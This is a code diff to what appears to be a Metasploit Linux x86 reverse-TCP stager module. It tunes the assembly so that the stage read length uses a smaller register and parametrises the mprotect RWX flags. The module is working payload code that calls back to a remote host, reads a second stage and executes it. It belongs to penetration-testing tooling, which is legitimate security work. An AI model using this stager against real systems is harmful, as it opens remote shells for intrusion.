@@ -89,6 +89,33 @@ module Payload::Linux::ReverseTcp_x86
     sleep_seconds = seconds.to_i
     sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
+    mprotect_flags = 0b111 # PROT_READ | PROT_WRITE | PROT_EXEC
+
+    if respond_to?(:generate_intermediate_stage)
+      pay_mod = framework.payloads.create(self.refname)
+      read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size
+    elsif !module_info['Stage']['Payload'].empty?
+      read_length = module_info['Stage']['Payload'].size
+    else
+      # If we don't know, at least use small instructions
+      read_length = 0x0c00 + mprotect_flags
+    end
+
+    # I was bored on the train, ok?
+    read_reg =
+      if read_length % 0x100 == mprotect_flags && read_length <= 0xff00 + mprotect_flags
+        # We use `edx` as part mprotect, but at two bytes assembled, this edge case is worth checking:
+        # If the lower byte will be the same, just set the upper byte
+        read_length = read_length / 0x100
+        'dh'
+      elsif read_length < 0x100
+        'dl' # Also assembles in two bytes ^.^
+      elsif read_length < 0x10000
+        'dx' # Shave a byte off of setting `edx`
+      else
+        'edx' # Take five bytes :/
+      end
+
     asm = %Q^
         push #{retry_count}        ; retry counter
         pop esi
@@ -141,7 +168,7 @@ module Payload::Linux::ReverseTcp_x86
 
     asm << %Q^
       mprotect:
-        mov dl, 0x7
+        mov dl, 0x#{mprotect_flags.to_s(16)}
         mov ecx, 0x1000
         mov ebx, esp
         shr ebx, 0xc
@@ -155,7 +182,7 @@ module Payload::Linux::ReverseTcp_x86
         pop ebx
         mov ecx, esp
         cdq
-        mov dh, 0xc
+        mov #{read_reg},  0x#{read_length.to_s(16)}
         mov al, 0x3
         int 0x80                  ; sys_read (recv())
         test eax, eax
